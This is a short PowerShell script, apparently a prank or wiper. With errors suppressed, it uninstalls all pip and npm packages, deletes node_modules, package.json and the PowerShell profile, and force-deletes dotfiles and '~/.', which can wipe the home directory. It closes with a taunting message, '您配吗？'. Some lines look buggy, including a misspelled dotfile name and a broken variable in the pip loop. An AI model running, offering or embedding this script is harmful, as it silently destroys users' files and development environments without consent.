$script:ErrorActionPreference = 'SilentlyContinue'

# pip
'pip', 'pip3' | ? { Get-Command $_ } | % {
    & $_ list --disable-pip-version-check --format json | ConvertFrom-Json | % { & $_ uninstall -y $_.Name}
}

# npm
'npm' | ? { Get-Command $_ } | % {
    & $_ cache verify
    & $_ cache clean --force
    & $_ uninstall *
}
Remove-Item -Recurse -Force node_modules, package.json

# PowerShell
Get-InstalledModule | Remove-Module
Remove-Item -Force $PROFILE

# dotfiles
Remove-Item -Recurse -Force ~/.nuget, ~/.bashrc, ~/.zscrc, ~/.

# Show message
if ($PSVersionTable.PSEdition -eq 'Desktop' -or $IsWindows) {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show('您配吗？')
}
Write-Host '您配吗？' -ForegroundColor Magenta
